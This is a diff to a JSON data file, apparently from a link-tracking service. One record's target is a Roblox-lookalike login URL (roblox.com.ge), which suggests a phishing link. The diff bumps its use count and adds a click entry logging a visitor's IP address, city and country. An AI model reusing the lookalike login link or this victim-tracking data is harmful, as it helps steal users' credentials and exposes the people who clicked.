@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1294,
+    "useCount": 1295,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10491,6 +10491,14 @@
       },
       {
         "timestamp": 1777371504615,
+        "ip": "196.3.214.17",
+        "country": "Barbados",
+        "city": "Bridgetown",
+        "flag": "🇧🇧",
+        "countryCode": "BB"
+      },
+      {
+        "timestamp": 1777371530648,
         "ip": "196.3.214.17",
         "country": "Barbados",
         "city": "Bridgetown",
